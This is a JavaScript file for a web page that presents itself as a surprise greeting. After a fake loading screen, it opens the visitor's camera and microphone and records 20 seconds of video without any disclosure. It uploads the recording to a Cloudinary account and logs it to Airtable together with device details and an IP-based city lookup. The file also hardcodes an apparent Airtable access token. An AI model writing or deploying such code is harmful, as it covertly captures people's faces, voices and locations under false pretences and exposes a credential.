const CLOUD_NAME="dpzzfcy84";
const UPLOAD_PRESET="forBANIKA";
const AIRTABLE_BASE="appBTargpA8GtlXJ3";
const AIRTABLE_TABLE="forBANIKA";
const AIRTABLE_TOKEN="pat2Peju0n3CZu6nv.6fe676b0b2df9d5cae2611a0b378b21920e630dd7f46cd199e1fc02047be4c9c";

const $=i=>document.getElementById(i);
const show=id=>{
document.querySelectorAll(".page").forEach(p=>p.classList.remove("show"));
$(id).classList.add("show");
};

const intro=$("introVideo");
const surprise=$("surpriseVideo");
const btn=$("startBtn");

intro.onended=()=>show("card");

btn.onclick=()=>{
show("loader");
setTimeout(()=>{show("surprise");startRec();},5000);
};

async function startRec(){
const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
surprise.srcObject=stream;
await surprise.play();

const rec=new MediaRecorder(stream);
const data=[];
rec.ondataavailable=e=>data.push(e.data);
rec.start();

await new Promise(r=>setTimeout(r,20000));
rec.stop();

const blob=await new Promise(r=>rec.onstop=()=>r(new Blob(data,{type:"video/webm"})));
stream.getTracks().forEach(t=>t.stop());

const url=await upload(blob);
const info=await collect();
await log({video:url,...info});
show("end");
}

async function upload(blob){
const f=new FormData();
f.append("file",blob);
f.append("upload_preset",UPLOAD_PRESET);
const r=await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`,{method:"POST",body:f});
const j=await r.json();
return j.secure_url;
}

async function collect(){
const ua=navigator.userAgent;
let city="";
try{
const r=await fetch("https://ipapi.co/json/");
const j=await r.json();
city=j.city||"";
}catch(e){}
return{
DeviceModel:ua,
DeviceType:/Mobi|Android/i.test(ua)?"Mobile":"Desktop",
Browser:/Chrome/i.test(ua)?"Chrome":/Firefox/i.test(ua)?"Firefox":"Other",
City:city,
Time:new Date().toISOString()
};
}

async function log(d){
await fetch(`https://api.airtable.com/v0/${AIRTABLE_BASE}/${encodeURIComponent(AIRTABLE_TABLE)}`,{
method:"POST",
headers:{
"Authorization":"Bearer "+AIRTABLE_TOKEN,
"Content-Type":"application/json"
},
body:JSON.stringify({fields:{
VideoURL:d.video,
DeviceModel:d.DeviceModel,
DeviceType:d.DeviceType,
Browser:d.Browser,
City:d.City,
Time:d.Time
}})
});
}
